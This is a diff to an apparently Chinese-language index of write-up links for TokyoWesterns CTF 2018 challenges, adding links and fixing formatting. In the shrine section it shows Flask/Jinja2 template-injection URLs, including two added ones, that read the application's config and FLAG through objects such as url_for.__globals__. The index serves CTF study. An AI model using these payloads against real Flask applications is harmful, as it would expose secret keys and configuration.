@@ -43,13 +43,25 @@
   ```http
   http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.__class__.__dict__['_load_form_data'].__globals__['current_app'].config}}
   ```
+  ```http
+  http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__['current_app'].config['FLAG']}}
+  ```
+
+  ```http
+  http://shrine.chal.ctf.westerns.tokyo/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+  ```
+
   https://ctftime.org/writeup/10851 by DoubleSigma
+
+  https://ctftime.org/writeup/10895 by PwnaSonic
 
 - **SimpleAuth** 
 
   https://fireshellsecurity.team/simpleauth/ 
 
-  https://ctftime.org/writeup/10876 
+  https://ctftime.org/writeup/10876 by E-Toolz
+
+  https://ctftime.org/writeup/10891 by PwnaSonic
 
 - **load** 
 
@@ -91,13 +103,27 @@
 
   https://github.com/OAlienO/CTF/tree/master/2018/TokyoWesterns-CTF-4th/mixed-cipher
 
-- **Neighbor C ** 
+- **Neighbor C** 
 
   https://ctftime.org/writeup/10873 by OpenToAll
+
+- **EscapeMe** 
+
+  [TokyoWesterns CTF 2018 - pwn240+300+300 EscapeMe](https://david942j.blogspot.com/2018/09/write-up-tokyowesterns-ctf-2018.html) 
+
+- **dec dec dec**
+
+  https://github.com/ccowmu/ctf_2018/tree/master/writeups/TokyoCTF2018/dec-dec-dec 
+
+- **Matrix LED**
+
+  https://github.com/p4-team/ctf/tree/master/2018-09-01-tokyowesterns/matrix_led 
 
 - **其他**：
 
   [Revolutional Secure Angou](https://ctftime.org/writeup/10862) by SealTeam1
 
   [Tokyo Western CTF 2018 (Qualification Round) Hints for some Crypto challenges](https://github.com/nguyenduyhieukma/CTF-Writeups/tree/master/Tokyo%20Western%20CTF/2018) 
+
+  [TokyoWesterns CTF 4th 2018 - Write-ups](https://rawsec.ml/en/Tokyo-Westerns-2018-write-ups/) 
 
